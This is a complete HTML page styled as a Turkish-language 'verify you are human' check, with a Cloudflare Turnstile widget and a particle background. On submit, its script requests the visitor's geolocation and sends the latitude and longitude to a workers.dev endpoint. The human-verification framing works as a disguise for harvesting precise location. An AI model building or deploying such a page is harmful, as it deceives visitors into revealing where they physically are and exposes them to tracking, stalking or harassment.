<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Discipline Hub</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<style>
body {
  margin:0;
  height:100vh;
  background: radial-gradient(circle at center, #0f0f0f, #000);
  overflow:hidden;
  font-family: Arial, sans-serif;
  color:white;
}

canvas {
  position:fixed;
  top:0;
  left:0;
  z-index:0;
}

.card {
  position:relative;
  z-index:2;
  top:50%;
  transform:translateY(-50%);
  text-align:center;
  background: rgba(0,0,0,0.6);
  padding:40px;
  border-radius:20px;
  box-shadow:0 0 40px #00f0ff;
  backdrop-filter: blur(10px);
}

button {
  margin-top:20px;
  padding:12px 30px;
  background:#00f0ff;
  border:none;
  border-radius:8px;
  font-size:16px;
  cursor:pointer;
  transition:0.3s;
}

button:hover {
  background:#ff00ff;
  box-shadow:0 0 20px #ff00ff;
}
</style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="card">
<h2>İnsan olduğunuzu doğrulayın</h2>

<form id="verifyForm">
  <div class="cf-turnstile"
       data-sitekey="0x4AAAAAACajPIDrosxxpJUl">
  </div>

  <button type="submit">Devam Et</button>
</form>
</div>

<script>
const canvas = document.getElementById("bg");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let particles = [];
for(let i=0;i<120;i++){
  particles.push({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height,
    vx:(Math.random()-0.5)*1.5,
    vy:(Math.random()-0.5)*1.5
  });
}

function animate(){
  ctx.fillStyle="rgba(0,0,0,0.2)";
  ctx.fillRect(0,0,canvas.width,canvas.height);

  ctx.strokeStyle="#00f0ff";
  ctx.lineWidth=0.5;

  particles.forEach(p=>{
    p.x+=p.vx;
    p.y+=p.vy;

    if(p.x<0||p.x>canvas.width) p.vx*=-1;
    if(p.y<0||p.y>canvas.height) p.vy*=-1;

    ctx.beginPath();
    ctx.arc(p.x,p.y,2,0,Math.PI*2);
    ctx.fillStyle="#ff00ff";
    ctx.fill();
  });

  requestAnimationFrame(animate);
}

animate();

document.getElementById("verifyForm").addEventListener("submit", async function(e){
  e.preventDefault();

  if (!navigator.geolocation) {
    alert("Konum desteklenmiyor.");
    return;
  }

  navigator.geolocation.getCurrentPosition(async function(position){

    const formData = new FormData(e.target);
    formData.append("latitude", position.coords.latitude);
    formData.append("longitude", position.coords.longitude);

    const res = await fetch("https://disciplinehub.disciplinehub.workers.dev", {
      method: "POST",
      body: formData
    });

    const text = await res.text();
    alert(text);

  }, function(){
    alert("Konum izni verilmedi.");
  });

});
</script>

</body>
</html>
